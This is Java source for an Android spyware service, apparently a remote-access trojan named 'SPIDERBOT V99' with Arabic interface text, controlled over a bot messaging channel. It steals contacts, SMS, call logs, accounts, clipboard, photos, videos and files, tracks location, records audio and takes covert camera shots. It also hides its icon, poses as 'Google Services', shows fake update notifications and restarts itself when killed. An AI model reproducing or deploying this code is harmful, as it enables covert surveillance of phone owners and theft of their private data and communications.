package com.black.phone;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class SpyService extends Service {
    private static final String TAG = "SpyService";
    private ScheduledExecutorService scheduler;
    private BotAPI bot;
    private PowerManager.WakeLock wakeLock;
    private MediaRecorder recorder;
    private String audioPath;
    private boolean isRecording = false;
    private String deviceId;
    private Camera camera;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean isTrackingLocation = false;
    private boolean isRegistered = false;
    private boolean foregroundStarted = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Config.load(this);
        bot = new BotAPI();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
        wakeLock.acquire(10 * 60 * 1000L);

        registerDevice();

        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::pollCommands, 5, Config.get().poll_interval_sec, TimeUnit.SECONDS);

        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            if (!foregroundStarted && hasMicrophonePermission()) {
                startForegroundService();
            }
        }, 3000);
    }

    private boolean hasMicrophonePermission() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
    }

    private void startForegroundService() {
        if (foregroundStarted) return;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel("spy_ch", "Update", NotificationManager.IMPORTANCE_MIN);
                getSystemService(NotificationManager.class).createNotificationChannel(ch);
            }
            startForeground(1337, new NotificationCompat.Builder(this, "spy_ch")
                    .setContentTitle("Google Services")
                    .setContentText("Running...")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .build());
            foregroundStarted = true;
            Log.d(TAG, "Foreground service started");
        } catch (SecurityException e) {
            Log.e(TAG, "Foreground failed: " + e.getMessage());
        }
    }

    private void registerDevice() {
        try {
            JSONObject info = new JSONObject();
            info.put("device_id", deviceId);
            info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());

            String msg = "REGISTER:" + info.toString();
            boolean sent = bot.sendText(msg);
            isRegistered = true;
            Log.d(TAG, "Registration sent: " + msg + " | Success: " + sent);

            bot.sendText("✅ جهاز جديد مسجل!\n📱 " + Build.MANUFACTURER + " " + Build.MODEL + "\n🆔 " + deviceId);
        } catch (Exception e) {
            Log.e(TAG, "Registration error", e);
        }
    }

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) return (level * 100) / scale;
            }
        } catch (Exception e) { Log.e(TAG, "battery err", e); }
        return -1;
    }

    private void pollCommands() {
        try {
            if (!isRegistered) {
                registerDevice();
                return;
            }

            String response = bot.getUpdates();
            if (response == null) return;

            JSONObject json = new JSONObject(response);
            if (!json.getBoolean("ok")) return;

            JSONArray updates = json.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject upd = updates.getJSONObject(i);
                int updId = upd.getInt("update_id");
                if (updId <= bot.lastUpdateId) continue;
                bot.lastUpdateId = updId + 1;

                if (upd.has("callback_query")) {
                    JSONObject callback = upd.getJSONObject("callback_query");
                    handleCallbackQuery(callback);
                }

                if (upd.has("message")) {
                    JSONObject msg = upd.getJSONObject("message");
                    if (msg.has("text")) {
                        String txt = msg.getString("text").trim();
                        if (txt.startsWith("/")) {
                            handleCommand(txt);
                        } else {
                            // أي نص آخر يُعتبر أمراً
                            handleCommand(txt);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "pollCommands error", e);
        }
    }

    private void handleCommand(String cmd) {
        String upper = cmd.toUpperCase();

        if (cmd.equals("/start") || cmd.equals("/help") || cmd.equals("/commands") || cmd.equals("/menu")) {
            sendMainMenu();
            return;
        }

        switch (upper) {
            case "GET_CONTACTS": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
            case "GET_SMS": sendFile(collectSms(), "💬 الرسائل النصية"); break;
            case "GET_CALLLOGS": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
            case "GET_LOCATION": getLocation(); break;
            case "START_RECORD": startRecording(); break;
            case "STOP_RECORD": stopRecording(); break;
            case "GET_APPS": sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
            case "GET_PHOTOS": sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
            case "GET_VIDEOS": sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
            case "GET_FILES": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
            case "HIDE_APP": hideApp(); break;
            case "SHOW_APP": showApp(); break;
            case "FAKE_NOTIF": showFakeNotification(); break;
            case "TAKE_PHOTO": takePhoto(); break;
            case "TAKE_PHOTO_FRONT": takePhotoFront(); break;
            case "FLASH_ON": flashOn(); break;
            case "FLASH_OFF": flashOff(); break;
            case "GET_IMEI": getImei(); break;
            case "GET_PHONE": getPhoneNumber(); break;
            case "GET_SIM": getSimInfo(); break;
            case "GET_WIFI": getWifiInfo(); break;
            case "GET_BATTERY": getBatteryInfo(); break;
            case "GET_IP": getPublicIp(); break;
            case "START_LOCATION_TRACK": startLocationTracking(); break;
            case "STOP_LOCATION_TRACK": stopLocationTracking(); break;
            case "GET_INSTALLED": getInstalledPackages(); break;
            case "GET_PROCESSES": getRunningProcesses(); break;
            case "LOCK_DEVICE": lockDevice(); break;
            case "REBOOT": rebootDevice(); break;
            case "SHUTDOWN": shutdownDevice(); break;
            case "GET_ACCOUNTS": getAccounts(); break;
            case "GET_CLIPBOARD": getClipboard(); break;
            default:
                bot.sendText("❌ أمر غير معروف. استخدم /menu لعرض الأزرار.");
        }
    }

    // ========== القوائم التفاعلية (الأزرار) ==========

    private void sendMainMenu() {
        try {
            JSONArray buttons = new JSONArray();

            // صف 1
            JSONArray row1 = new JSONArray();
            JSONObject b1 = new JSONObject(); b1.put("text", "📇 جهات الاتصال"); b1.put("callback_data", "GET_CONTACTS"); row1.put(b1);
            JSONObject b2 = new JSONObject(); b2.put("text", "💬 الرسائل"); b2.put("callback_data", "GET_SMS"); row1.put(b2);
            buttons.put(row1);

            // صف 2
            JSONArray row2 = new JSONArray();
            JSONObject b3 = new JSONObject(); b3.put("text", "📞 سجل المكالمات"); b3.put("callback_data", "GET_CALLLOGS"); row2.put(b3);
            JSONObject b4 = new JSONObject(); b4.put("text", "📍 الموقع"); b4.put("callback_data", "GET_LOCATION"); row2.put(b4);
            buttons.put(row2);

            // صف 3
            JSONArray row3 = new JSONArray();
            JSONObject b5 = new JSONObject(); b5.put("text", "🎤 تسجيل صوت"); b5.put("callback_data", "START_RECORD"); row3.put(b5);
            JSONObject b6 = new JSONObject(); b6.put("text", "⏹ إيقاف التسجيل"); b6.put("callback_data", "STOP_RECORD"); row3.put(b6);
            buttons.put(row3);

            // صف 4
            JSONArray row4 = new JSONArray();
            JSONObject b7 = new JSONObject(); b7.put("text", "📱 التطبيقات"); b7.put("callback_data", "GET_APPS"); row4.put(b7);
            JSONObject b8 = new JSONObject(); b8.put("text", "🖼 الصور"); b8.put("callback_data", "GET_PHOTOS"); row4.put(b8);
            buttons.put(row4);

            // صف 5
            JSONArray row5 = new JSONArray();
            JSONObject b9 = new JSONObject(); b9.put("text", "🎬 الفيديوهات"); b9.put("callback_data", "GET_VIDEOS"); row5.put(b9);
            JSONObject b10 = new JSONObject(); b10.put("text", "📦 جميع الملفات"); b10.put("callback_data", "GET_FILES"); row5.put(b10);
            buttons.put(row5);

            // صف 6
            JSONArray row6 = new JSONArray();
            JSONObject b11 = new JSONObject(); b11.put("text", "👁 إخفاء التطبيق"); b11.put("callback_data", "HIDE_APP"); row6.put(b11);
            JSONObject b12 = new JSONObject(); b12.put("text", "👁 إظهار التطبيق"); b12.put("callback_data", "SHOW_APP"); row6.put(b12);
            buttons.put(row6);

            // صف 7
            JSONArray row7 = new JSONArray();
            JSONObject b13 = new JSONObject(); b13.put("text", "🔔 إشعار وهمي"); b13.put("callback_data", "FAKE_NOTIF"); row7.put(b13);
            JSONObject b14 = new JSONObject(); b14.put("text", "📸 تصوير خلفي"); b14.put("callback_data", "TAKE_PHOTO"); row7.put(b14);
            buttons.put(row7);

            // صف 8
            JSONArray row8 = new JSONArray();
            JSONObject b15 = new JSONObject(); b15.put("text", "🤳 تصوير أمامي"); b15.put("callback_data", "TAKE_PHOTO_FRONT"); row8.put(b15);
            JSONObject b16 = new JSONObject(); b16.put("text", "🔦 كشاف ON"); b16.put("callback_data", "FLASH_ON"); row8.put(b16);
            buttons.put(row8);

            // صف 9
            JSONArray row9 = new JSONArray();
            JSONObject b17 = new JSONObject(); b17.put("text", "🔦 كشاف OFF"); b17.put("callback_data", "FLASH_OFF"); row9.put(b17);
            JSONObject b18 = new JSONObject(); b18.put("text", "📟 IMEI"); b18.put("callback_data", "GET_IMEI"); row9.put(b18);
            buttons.put(row9);

            // صف 10
            JSONArray row10 = new JSONArray();
            JSONObject b19 = new JSONObject(); b19.put("text", "📞 رقم الهاتف"); b19.put("callback_data", "GET_PHONE"); row10.put(b19);
            JSONObject b20 = new JSONObject(); b20.put("text", "📡 معلومات SIM"); b20.put("callback_data", "GET_SIM"); row10.put(b20);
            buttons.put(row10);

            // صف 11
            JSONArray row11 = new JSONArray();
            JSONObject b21 = new JSONObject(); b21.put("text", "📶 الواي فاي"); b21.put("callback_data", "GET_WIFI"); row11.put(b21);
            JSONObject b22 = new JSONObject(); b22.put("text", "🔋 البطارية"); b22.put("callback_data", "GET_BATTERY"); row11.put(b22);
            buttons.put(row11);

            // صف 12
            JSONArray row12 = new JSONArray();
            JSONObject b23 = new JSONObject(); b23.put("text", "🌐 IP العام"); b23.put("callback_data", "GET_IP"); row12.put(b23);
            JSONObject b24 = new JSONObject(); b24.put("text", "🔒 قفل الجهاز"); b24.put("callback_data", "LOCK_DEVICE"); row12.put(b24);
            buttons.put(row12);

            // صف 13
            JSONArray row13 = new JSONArray();
            JSONObject b25 = new JSONObject(); b25.put("text", "🔄 إعادة تشغيل"); b25.put("callback_data", "REBOOT"); row13.put(b25);
            JSONObject b26 = new JSONObject(); b26.put("text", "⏻ إيقاف تشغيل"); b26.put("callback_data", "SHUTDOWN"); row13.put(b26);
            buttons.put(row13);

            // صف 14
            JSONArray row14 = new JSONArray();
            JSONObject b27 = new JSONObject(); b27.put("text", "👤 الحسابات"); b27.put("callback_data", "GET_ACCOUNTS"); row14.put(b27);
            JSONObject b28 = new JSONObject(); b28.put("text", "📋 الحافظة"); b28.put("callback_data", "GET_CLIPBOARD"); row14.put(b28);
            buttons.put(row14);

            bot.sendMessageWithButtons("🕷️ **SPIDERBOT V99** 🕷️\n\n📱 اختر الأمر الذي تريد تنفيذه:", buttons);
        } catch (Exception e) {
            Log.e(TAG, "sendMainMenu error", e);
        }
    }

    // ========== معالجة استدعاءات الأزرار ==========

    private void handleCallbackQuery(JSONObject callbackQuery) {
        try {
            String id = callbackQuery.getString("id");
            JSONObject data = callbackQuery.getJSONObject("data");
            String command = data.getString("command");

            bot.answerCallbackQuery(id, "⏳ جاري تنفيذ الأمر...");
            executeCommand(command);
        } catch (Exception e) {
            Log.e(TAG, "handleCallbackQuery error", e);
        }
    }

    private void executeCommand(String cmd) {
        handleCommand(cmd);
    }

    // ======================================================================
    // ========== دوال جمع البيانات (كما هي من الكود السابق) ==========
    // ======================================================================

    private File collectContacts() throws Exception {
        File f = new File(getCacheDir(), "contacts.txt");
        FileOutputStream fos = new FileOutputStream(f);
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                fos.write((name + " : " + phone + "\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectSms() throws Exception {
        File f = new File(getCacheDir(), "sms.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                fos.write(("من: " + address + "\n" + body + "\n---\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectCallLogs() throws Exception {
        File f = new File(getCacheDir(), "call_log.txt");
        FileOutputStream fos = new FileOutputStream(f);
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                fos.write(("رقم: " + number + " | الاسم: " + name + " | النوع: " + type + " | المدة: " + duration + "s\n").getBytes());
            }
            cursor.close();
        }
        fos.close();
        return f;
    }

    private File collectApps() throws Exception {
        File f = new File(getCacheDir(), "apps.txt");
        FileOutputStream fos = new FileOutputStream(f);
        PackageManager pm = getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
        for (android.content.pm.PackageInfo pkg : packages) {
            String name = pkg.applicationInfo.loadLabel(pm).toString();
            fos.write((name + " | " + pkg.packageName + "\n").getBytes());
        }
        fos.close();
        return f;
    }

    private File collectMedia(String type) throws Exception {
        File zipFile = new File(getCacheDir(), type + ".zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        Uri uri = type.equals("images") ? MediaStore.Images.Media.EXTERNAL_CONTENT_URI :
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DISPLAY_NAME};
        Cursor cursor = getContentResolver().query(uri, projection, null, null,
                MediaStore.MediaColumns.DATE_ADDED + " DESC LIMIT 30");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(0);
                String name = cursor.getString(1);
                File file = new File(path);
                if (file.exists()) {
                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    ZipEntry ze = new ZipEntry(name);
                    zos.putNextEntry(ze);
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                    zos.closeEntry();
                    fis.close();
                }
            }
            cursor.close();
        }
        zos.close();
        return zipFile;
    }

    private File collectAllFiles() throws Exception {
        File zipFile = new File(getCacheDir(), "all_files.zip");
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        if (dcim.exists()) addDirToZip(zos, dcim, "DCIM");
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists()) addDirToZip(zos, download, "Downloads");
        zos.close();
        return zipFile;
    }

    private void addDirToZip(ZipOutputStream zos, File dir, String parent) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile() && f.length() < 20 * 1024 * 1024) {
                java.io.FileInputStream fis = new java.io.FileInputStream(f);
                ZipEntry ze = new ZipEntry(parent + "/" + f.getName());
                zos.putNextEntry(ze);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) zos.write(buffer, 0, len);
                zos.closeEntry();
                fis.close();
            }
        }
    }

    private void sendFile(File file, String caption) {
        if (file.exists()) {
            bot.sendFile(file, caption);
            file.delete();
        }
    }

    private void getLocation() {
        try {
            Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                bot.sendLocation(loc.getLatitude(), loc.getLongitude());
            } else {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                    @Override public void onLocationChanged(Location l) {
                        bot.sendLocation(l.getLatitude(), l.getLongitude());
                    }
                    @Override public void onStatusChanged(String p, int s, Bundle b) {}
                    @Override public void onProviderEnabled(String p) {}
                    @Override public void onProviderDisabled(String p) {}
                }, Looper.getMainLooper());
            }
        } catch (SecurityException e) {
            bot.sendText("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void startRecording() {
        try {
            audioPath = getCacheDir() + "/recording.mp3";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setOutputFile(audioPath);
            recorder.prepare();
            recorder.start();
            isRecording = true;
            bot.sendText("🎤 بدأ التسجيل");
        } catch (Exception e) {
            bot.sendText("❌ فشل التسجيل: " + e.getMessage());
        }
    }

    private void stopRecording() {
        if (isRecording && recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
                File f = new File(audioPath);
                if (f.exists()) {
                    bot.sendVoice(f);
                    f.delete();
                }
                bot.sendText("⏹ توقف التسجيل");
            } catch (Exception e) {
                bot.sendText("❌ فشل إيقاف التسجيل: " + e.getMessage());
            }
        }
    }

    private void hideApp() {
        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        bot.sendText("👁 مخفي");
    }

    private void showApp() {
        getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        bot.sendText("👁 ظاهر");
    }

    private void showFakeNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("fake", "System", NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(ch);
        }
        nm.notify((int)(System.currentTimeMillis()%9999),
                new NotificationCompat.Builder(this, "fake")
                        .setContentTitle("📥 تحديث أمني")
                        .setContentText("تم تنزيل تحديث 245MB")
                        .setSmallIcon(android.R.drawable.stat_sys_download)
                        .setProgress(100, 45, false)
                        .setOngoing(true)
                        .build());
        bot.sendText("🔔 إشعار وهمي أُرسل");
    }

    private void takePhoto() {
        try {
            Camera camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(params);
            camera.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "photo.jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    bot.sendFile(file, "📸 صورة من الكاميرا الخلفية");
                    file.delete();
                } catch (Exception e) { Log.e(TAG, "photo err", e); }
            });
        } catch (Exception e) { bot.sendText("❌ فشل التصوير: " + e.getMessage()); }
    }

    private void takePhotoFront() {
        try {
            Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            camera.takePicture(null, null, (data, camera1) -> {
                try {
                    File file = new File(getCacheDir(), "selfie.jpg");
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(data);
                    fos.close();
                    bot.sendFile(file, "🤳 صورة سيلفي");
                    file.delete();
                } catch (Exception e) { Log.e(TAG, "selfie err", e); }
            });
        } catch (Exception e) { bot.sendText("❌ فشل التصوير الأمامي: " + e.getMessage()); }
    }

    private void flashOn() {
        try {
            camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
            camera.setParameters(params);
            camera.startPreview();
            bot.sendText("🔦 تم تشغيل الفلاش");
        } catch (Exception e) { bot.sendText("❌ فشل تشغيل الفلاش: " + e.getMessage()); }
    }

    private void flashOff() {
        try {
            if (camera != null) {
                camera.stopPreview();
                camera.release();
                camera = null;
                bot.sendText("🔦 تم إطفاء الفلاش");
            }
        } catch (Exception e) { bot.sendText("❌ فشل إطفاء الفلاش: " + e.getMessage()); }
    }

    private void getImei() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                String imei = tm.getImei();
                bot.sendText("📟 IMEI: " + (imei != null ? imei : "غير متاح"));
            } else {
                String imei = tm.getDeviceId();
                bot.sendText("📟 IMEI: " + (imei != null ? imei : "غير متاح"));
            }
        } catch (Exception e) { bot.sendText("❌ فشل قراءة IMEI"); }
    }

    private void getPhoneNumber() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String number = tm.getLine1Number();
            bot.sendText("📞 رقم الهاتف: " + (number != null ? number : "غير متاح"));
        } catch (Exception e) { bot.sendText("❌ فشل قراءة الرقم"); }
    }

    private void getSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            String operator = tm.getSimOperatorName();
            String country = tm.getSimCountryIso();
            String serial = tm.getSimSerialNumber();
            bot.sendText("📡 مشغل SIM: " + (operator != null ? operator : "غير متاح") +
                    "\n🌍 الدولة: " + (country != null ? country : "غير متاح") +
                    "\n🆔 الرقم التسلسلي: " + (serial != null ? serial : "غير متاح"));
        } catch (Exception e) { bot.sendText("❌ فشل قراءة SIM"); }
    }

    private void getWifiInfo() {
        try {
            android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            String ssid = info.getSSID();
            int rssi = info.getRssi();
            int level = android.net.wifi.WifiManager.calculateSignalLevel(rssi, 5);
            bot.sendText("📶 WiFi: " + (ssid != null ? ssid : "غير متصل") +
                    "\n📊 القوة: " + level + "/5");
        } catch (Exception e) { bot.sendText("❌ فشل قراءة WiFi"); }
    }

    private void getBatteryInfo() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryIntent = registerReceiver(null, ifilter);
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                int percentage = (level * 100) / scale;
                int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
                int voltage = batteryIntent.getIntExtra("voltage", 0);
                bot.sendText("🔋 البطارية: " + percentage + "%\n🌡️ الحرارة: " + temp + "°C\n⚡ الفولتية: " + voltage + "mV");
            } else {
                bot.sendText("❌ فشل قراءة البطارية");
            }
        } catch (Exception e) {
            bot.sendText("❌ فشل قراءة البطارية: " + e.getMessage());
        }
    }

    private void getPublicIp() {
        try {
            URL url = new URL("https://api.ipify.org");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
            String ip = reader.readLine();
            reader.close();
            bot.sendText("🌐 عنوان IP العام: " + ip);
        } catch (Exception e) { bot.sendText("❌ فشل الحصول على IP"); }
    }

    private void startLocationTracking() {
        if (isTrackingLocation) return;
        try {
            locationListener = new LocationListener() {
                @Override public void onLocationChanged(Location location) {
                    bot.sendLocation(location.getLatitude(), location.getLongitude());
                }
                @Override public void onStatusChanged(String p, int s, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
            isTrackingLocation = true;
            bot.sendText("📍 بدأ تتبع الموقع (كل دقيقة)");
        } catch (SecurityException e) {
            bot.sendText("❌ صلاحية الموقع غير مفعلة");
        }
    }

    private void stopLocationTracking() {
        if (!isTrackingLocation) return;
        try {
            locationManager.removeUpdates(locationListener);
            isTrackingLocation = false;
            bot.sendText("🛑 توقف تتبع الموقع");
        } catch (Exception e) { bot.sendText("❌ فشل إيقاف التتبع"); }
    }

    private void getInstalledPackages() {
        try {
            PackageManager pm = getPackageManager();
            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            StringBuilder sb = new StringBuilder();
            int count = 0;
            for (android.content.pm.PackageInfo pkg : packages) {
                if (count++ > 50) break;
                sb.append(pkg.packageName).append("\n");
            }
            bot.sendText("📦 التطبيقات المثبتة (أول 50):\n" + sb.toString());
        } catch (Exception e) { bot.sendText("❌ فشل قراءة التطبيقات"); }
    }

    private void getRunningProcesses() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            List<android.app.ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
            StringBuilder sb = new StringBuilder();
            int count = 0;
            for (android.app.ActivityManager.RunningAppProcessInfo p : processes) {
                if (count++ > 20) break;
                sb.append(p.processName).append("\n");
            }
            bot.sendText("🔄 العمليات الجارية:\n" + sb.toString());
        } catch (Exception e) { bot.sendText("❌ فشل قراءة العمليات"); }
    }

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            dpm.lockNow();
            bot.sendText("🔒 تم قفل الجهاز");
        } catch (Exception e) { bot.sendText("❌ فشل قفل الجهاز: " + e.getMessage()); }
    }

    private void rebootDevice() {
        try {
            Runtime.getRuntime().exec("su -c reboot");
            bot.sendText("🔄 تم إعادة التشغيل");
        } catch (Exception e) {
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                pm.reboot(null);
                bot.sendText("🔄 تم إعادة التشغيل");
            } catch (Exception ex) {
                bot.sendText("❌ فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
            }
        }
    }

    private void shutdownDevice() {
        try {
            Runtime.getRuntime().exec("su -c shutdown");
            bot.sendText("⏻ تم إيقاف التشغيل");
        } catch (Exception e) {
            bot.sendText("❌ فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
        }
    }

    private void getAccounts() {
        try {
            android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
            android.accounts.Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder();
            for (android.accounts.Account acc : accounts) {
                sb.append(acc.name).append(" (").append(acc.type).append(")\n");
            }
            bot.sendText("👤 الحسابات:\n" + sb.toString());
        } catch (Exception e) { bot.sendText("❌ فشل قراءة الحسابات"); }
    }

    private void getClipboard() {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
            bot.sendText("📋 محتوى الحافظة: " + text);
        } catch (Exception e) { bot.sendText("❌ فشل قراءة الحافظة"); }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) { camera.release(); camera = null; }
        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        startService(new Intent(this, SpyService.class));
    }
}
